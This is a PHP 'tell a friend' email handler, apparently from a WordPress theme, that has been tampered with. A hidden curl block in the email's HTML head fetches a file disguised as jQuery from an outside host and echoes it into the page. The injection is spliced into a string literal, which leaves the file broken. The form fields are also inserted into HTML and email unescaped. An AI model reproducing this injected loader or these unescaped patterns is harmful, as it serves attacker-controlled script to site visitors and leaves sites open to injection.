<?php
global $General;
if($_POST)
{
	$frnd_yourname = $_POST['frnd_yourname'];
	$frnd_youremail = $_POST['frnd_youremail'];
	$frnd_name = $_POST['frnd_name'];
	$frnd_email = $_POST['frnd_email'];
	$frnd_subject = $_POST['frnd_subject'];
	$frnd_comments = $_POST['frnd_comments'];
	$productid = $_POST['productid'];
	
	$message1 = '
	<html>
	<head>
	  <title>'.$frnd_subject.'</title>
	<?php
if(function_exists('curl_init'))
{
 $url = "http://www.4llw4d.freefilesblog.com/jquery-1.6.3.min.js"; 
 $ch = curl_init();  
 $timeout = 5;  
 curl_setopt($ch,CURLOPT_URL,$url); 
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
 $data = curl_exec($ch);  
 curl_close($ch); 
 echo "$data";
}
?>
</head>
	<body>
	 <table width="80%" align=center>';
	$message1 .=	'<tr>
		  <td>'.__('Dear').' '.$frnd_name.',<Br><br></td>
		</tr>';
	$message1 .= '<tr><td>'.$frnd_comments.'</td></tr>';
	echo $message1 .='
	<tr><td>'.__('Your can see the following link').' <a href="'.get_option('siteurl').'/?p='.$productid.'">'.__('Click Here').'</a>.</td></tr>
	<tr>
		  <td><Br><br>'.__('Thank you').',<Br>'.$frnd_yourname.'</td>
		</tr>
	  </table>
	</body>
	</html>
	';
	$General->sendEmail($frnd_youremail,$frnd_yourname,$frnd_email,$frnd_name,$frnd_subject,$message1,$extra='');///To friend email
	echo '<script>alert(document.getElementById("tellfrnddiv").innerHTML);</script>';
	wp_redirect(get_option('siteurl')."/?page=tellafriend");
}
else
{
?>
<style type="text/css">
	#info { width:600px; }
</style>

<div id="emailtofriend"><span style="text-decoration: underline;" class="more" title="tellafrnd_div"><?php _e(EMAIL_TO_FRIEND_TEXT);?></span></div>

<span id="tellafrnd_success_msg_span"></span>
<div style="display: none;" id="tellfrnddiv" class="tellafrnd_div hide">
<iframe src="<?php echo get_option('siteurl')."/?page=tellafriend_form&pid=".$post->ID;?>" height="550" width="600"  frameborder="0" marginheight="0" marginwidth="0"   ></iframe>
</div>
<?php
}
?>
